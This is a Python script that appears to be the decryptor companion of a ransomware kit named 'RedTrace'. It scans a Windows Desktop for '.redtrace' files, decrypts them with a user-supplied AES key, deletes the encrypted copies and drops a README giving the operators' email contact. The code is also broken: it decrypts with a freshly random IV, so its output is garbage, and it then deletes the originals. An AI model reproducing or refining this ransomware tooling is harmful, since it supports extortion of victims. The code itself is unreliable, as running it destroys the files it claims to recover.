import os
import base64
import concurrent.futures
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import winshell

email = "redtrace@tutanota.com"

def generate_aes_key():
    key_str = input("Enter the decryption key: ")
    return base64.b64decode(key_str)

def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            ciphertext = file.read()

        cipher = Cipher(algorithms.AES(key), modes.CFB(os.urandom(16)), backend=default_backend())
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()

        # Change the file extension back to the original one
        decrypted_file_path = file_path[:-len('.redtrace')]

        with open(decrypted_file_path, 'wb') as file:
            file.write(plaintext)

        print(f'Decrypted: {file_path} -> {decrypted_file_path}')

        # Delete the encrypted file
        os.remove(file_path)

    except Exception as e:
        print(f'Error decrypting {file_path}: {e}')

def scan_and_decrypt(root_dir, extensions, key):
    def process_file(file_path):
        try:
            decrypt_file(file_path, key)
        except Exception as e:
            print(f'Error decrypting {file_path}: {e}')

    with concurrent.futures.ThreadPoolExecutor() as executor:
        file_paths = [os.path.join(foldername, filename)
                      for foldername, subfolders, filenames in os.walk(root_dir)
                      for filename in filenames
                      if any(filename.lower().endswith('.redtrace') for ext in extensions)]

        executor.map(process_file, file_paths)

def create_readme_on_desktop(message):
    desktop_path = winshell.desktop()
    readme_path = os.path.join(desktop_path, "README.txt")

    with open(readme_path, 'w', encoding='utf-8') as readme_file:
        readme_file.write(message)

    print(f'Readme created on the desktop: {readme_path}')

def main():
    # Specify the root directory for scanning
    root_directory = 'C:\\Users\\User\\Desktop'  # Change this to the root directory you want to scan

    # Generate the AES key
    aes_key = generate_aes_key()

    print(f'AES Key: {base64.b64encode(aes_key)}')

    # Print key size during encryption
    print(f'Key size during encryption: {len(aes_key) * 8} bits')

    # Decrypt files
    scan_and_decrypt(root_directory, ['.redtrace'], aes_key)

    # Create a README.txt on the desktop
    readme_message = f"""
    Hello,\n
    If you are reading this, your files have been decrypted by the RedTrace decryptor.\n
    You can now access your files as usual.\n
    If you have any further concerns, contact us at {email}\n
    """
    create_readme_on_desktop(readme_message)

if __name__ == "__main__":
    main()
